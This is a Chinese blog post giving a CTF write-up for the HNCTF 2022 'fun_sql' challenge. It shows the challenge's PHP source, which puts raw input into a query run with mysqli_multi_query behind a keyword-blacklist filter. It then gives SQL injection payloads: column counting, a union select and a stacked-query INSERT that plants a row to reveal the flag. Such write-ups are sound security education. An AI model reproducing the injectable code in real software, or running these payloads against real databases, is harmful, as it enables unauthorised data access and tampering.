<h1 id="HNCTF-2022-WEEK4-fun-sql"><a href="#HNCTF-2022-WEEK4-fun-sql" class="headerlink" title="[HNCTF 2022 WEEK4]fun_sql"></a>[HNCTF 2022 WEEK4]fun_sql</h1><p>82分<br>堆叠注入SQL注入Insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ( $_GET[&#x27;uname&#x27;] != &#x27;&#x27; &amp;&amp; isset($_GET[&#x27;uname&#x27;])) &#123;</span><br><span class="line"></span><br><span class="line">    $uname=$_GET[&#x27;uname&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i&quot;,$uname))&#123;</span><br><span class="line">        die(&#x27;hacker&#x27;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $sql=&quot;SELECT * FROM ccctttfff WHERE uname=&#x27;$uname&#x27;;&quot;;</span><br><span class="line">    echo &quot;$sql&lt;br&gt;&quot;;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    mysqli_multi_query($db, $sql);</span><br><span class="line">    $result = mysqli_store_result($db);</span><br><span class="line">    $row = mysqli_fetch_row($result);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        die(&quot;something wrong&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">        echo $row[&#x27;uname&#x27;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[1] === $uname)</span><br><span class="line">    &#123;</span><br><span class="line">    die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__); </span><br></pre></td></tr></table></figure>
<p>我们目的就是返回flag，要求输入的uname 和 sql语句查询的uname 相等 那么我们思路就是插入一个uname 然后再查询<br>首先 看看本表多少列，4报错 3 正常所以3列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?uname=1&#x27;order by 4--+</span><br></pre></td></tr></table></figure>
<p>我们擦混入数据，正常来讲有uname的一般表中列的顺序一般就是id-uname-passwd<br>我们知道一共有三行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?uname=-1&#x27; union select 1,2,3;#</span><br></pre></td></tr></table></figure>
<p>回显：Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; 2 [2] &#x3D;&gt; 3 )<br>可以发现有三列，我们已经知道得到flag的条件为$row[1] &#x3D;&#x3D;&#x3D; $uname<br>也就是说只要我们查得到数据，即可得到flag</p>
<p>因此我们插入一个我们查得到的数据（表名给了为ccctttfff）<br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?uname=-1&#x27; union select 1,2,3;insert into ccctttfff value(1,1,1);#</span><br></pre></td></tr></table></figure>
<p>插入之后我们再访问uname&#x3D;1,得到flag</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://web-wuk0ng.github.io/2025/05/09/sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6(%E5%88%9D%E7%BA%A7)/">https://web-wuk0ng.github.io/2025/05/09/sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6(%E5%88%9D%E7%BA%A7)/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">wuk0Ng</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/sql%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/">
                                    <span class="chip bg-color">sql进阶学习</span>
                                </a>
                            
                                <a href="/tags/ctf%E8%B5%9B%E9%A2%98/">
                                    <span class="chip bg-color">ctf赛题</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/aliyunpay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'Ov23liTNlK9NLcZwFSo8',
        clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
        repo: 'blog---comments',
        owner: 'web-wuk0Ng',
        admin: ["web-wuk0Ng"],
        id: '2025-05-09T22-00-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/05/10/%E6%B5%8B%E8%AF%95%E5%8A%9F%E8%80%97/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="电脑性能测试">
                        
                        <span class="card-title">电脑性能测试</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-10
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
                                    记录
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%AE%B0%E5%BD%95/">
                        <span class="chip bg-color">记录</span>
                    </a>
                    
                    <a href="/tags/%E7%A1%AC%E4%BB%B6/">
                        <span class="chip bg-color">硬件</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/04/30/%E8%A7%84%E5%88%92/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="两周的规划">
                        
                        <span class="card-title">两周的规划</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
                                    记录
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%A7%84%E5%88%92/">
                        <span class="chip bg-color">规划</span>
                    </a>
                    
                    <a href="/tags/%E8%AE%B0%E5%BD%95/">
                        <span class="chip bg-color">记录</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2025</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">wuk0Ng</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
